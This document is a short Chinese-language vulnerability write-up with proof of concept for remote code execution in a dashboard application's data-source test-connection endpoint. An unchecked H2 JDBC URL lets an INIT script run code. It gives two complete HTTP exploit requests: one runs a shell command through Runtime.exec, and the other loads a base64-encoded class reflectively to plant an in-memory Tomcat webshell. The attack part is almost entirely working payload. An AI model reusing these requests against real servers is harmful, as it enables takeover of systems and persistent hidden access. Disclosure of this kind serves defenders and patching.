# H2database RCE

## 漏洞原理

新增数据源功能处虽未提供H2选项，但后端存在H2依赖，并且后端代码未校验jdbcurl协议头，导致选择什么类型的数据库和加载什么类型的驱动并不重要，只靠`DriverManager.getConnection`方法来识别协议头，连接特定的数据库。因此攻击者可以用恶意h2 jdbcurl远程执行代码

## POC

命令执行

```http
POST /bigScreenServer/datasource/testConnect HTTP/1.1
Host: 192.168.239.1:8081
Content-Length: 342
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
Content-Type: application/json; charset=UTF-8
Accept: */*
Origin: http://192.168.239.1:7521
Referer: http://192.168.239.1:7521/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

{"id":"","sourceName":"test","sourceType":"Mysql","driverClassName":"com.mysql.jdbc.Driver","username":"test","password":"123456","url":"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'void cmd_exec(String cmd) throws java.lang.Exception {Runtime.getRuntime().exec(cmd)\\;}'\\;CALL EXEC ('cmd /c calc')\\;","remark":""}
```

内存马

```http
POST /bigScreenServer/datasource/testConnect HTTP/1.1
Host: 192.168.239.1:8081
Content-Length: 1991
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
Content-Type: application/json; charset=UTF-8
Accept: */*
Origin: http://192.168.239.1:7521
Referer: http://192.168.239.1:7521/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_0febd9e3cacb3f627ddac64d52caac39=1773910763; Hm_lvt_4dbdbc5421c41984499f878628d60f2f=1775096484,1775096637; DG_USER_ID_ANONYMOUS=d6f22e453b7b42b3af52c8b17163cdc9; Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1780470842; X-Access-Token=e4180acf-832d-40aa-977e-2490ca27dc14; Hm_lvt_c37f4573e086c82c1c0cc22e1b9d38a1=1780474808
Connection: keep-alive

{"id":"","sourceName":"test","sourceType":"Mysql","driverClassName":"com.mysql.jdbc.Driver","username":"test","password":"123456","url":"jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER loader BEFORE SELECT ON\nINFORMATION_SCHEMA.TABLES AS $$void loader() throws java.lang.Exception{\nString tomcatStr=\"yv66...\"\\;\nbyte[] standBytes=new sun.misc.BASE64Decoder().decodeBuffer(tomcatStr)\\;\njava.lang.reflect.Method defineClassMethod=java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\",standBytes.getClass(),int.class,int.class)\\;\ndefineClassMethod.setAccessible(true)\\;\njava.lang.Class myclass=(java.lang.Class)defineClassMethod.invoke(java.lang.Thread.currentThread().getContextClassLoader(),standBytes,0,standBytes.length)\\;\nmyclass.newInstance()\\;}\n$$","remark":""}
```

